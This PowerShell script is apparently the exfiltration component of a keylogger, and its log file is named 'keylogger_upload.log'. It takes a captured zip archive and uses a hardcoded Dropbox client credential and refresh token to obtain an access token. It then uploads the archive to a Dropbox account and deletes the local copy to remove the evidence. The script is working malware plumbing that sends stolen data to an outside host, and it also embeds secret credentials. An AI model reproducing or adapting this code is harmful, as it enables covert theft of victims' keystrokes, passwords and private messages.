param([string]$ZipFilePath)

# Configuration
$LogFile = "$env:TMP\keylogger_upload.log"

function Write-Log {
    param([string]$Message, [string]$Level = "INFO")
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $logEntry = "[$timestamp] [$Level] $Message"
    Add-Content -Path $LogFile -Value $logEntry -ErrorAction SilentlyContinue
}

if (-not (Test-Path $ZipFilePath)) {
    Write-Log "File not found: $ZipFilePath" "ERROR"
    exit 1
}

$ZipFileName = Split-Path $ZipFilePath -Leaf

# Dropbox Config
$authHeaders = @{
    "Authorization" = "Basic ZHcwcTFvdHd5bGV5NnN1OnhhdGcxOWkzZ2Rhdzl6Mw=="
    "Content-Type"  = "application/x-www-form-urlencoded"
}
$tokenBody = @{
    refresh_token = "v7WZyrk-j24AAAAAAAAAAZ-cY6r3zipUPiO4a04evCkCLr83l2D7eZZp0F1JD4q3"
    grant_type    = "refresh_token"
}

# Get Access Token
try {
    $tokenResponse = Invoke-RestMethod -Uri "https://api.dropbox.com/oauth2/token" -Method Post -Headers $authHeaders -Body $tokenBody
    $accessToken = $tokenResponse.access_token
} catch {
    Write-Log "Failed to get access token: $_" "ERROR"
    exit 1
}

# Upload
$TargetFilePath = "/$ZipFileName"
$dropboxArg = @{
    path       = $TargetFilePath
    mode       = "add"
    autorename = $true
    mute       = $false
} | ConvertTo-Json -Compress

$uploadHeaders = @{
    "Authorization"   = "Bearer $accessToken"
    "Dropbox-API-Arg" = $dropboxArg
    "Content-Type"    = "application/octet-stream"
}

try {
    Invoke-RestMethod -Uri "https://content.dropboxapi.com/2/files/upload" -Method Post -InFile $ZipFilePath -Headers $uploadHeaders
    Write-Log "Uploaded $ZipFileName successfully" "SUCCESS"
    # Remove local file after upload
    Remove-Item -Path $ZipFilePath -Force
} catch {
    Write-Log "Upload failed: $_" "ERROR"
    exit 1
}
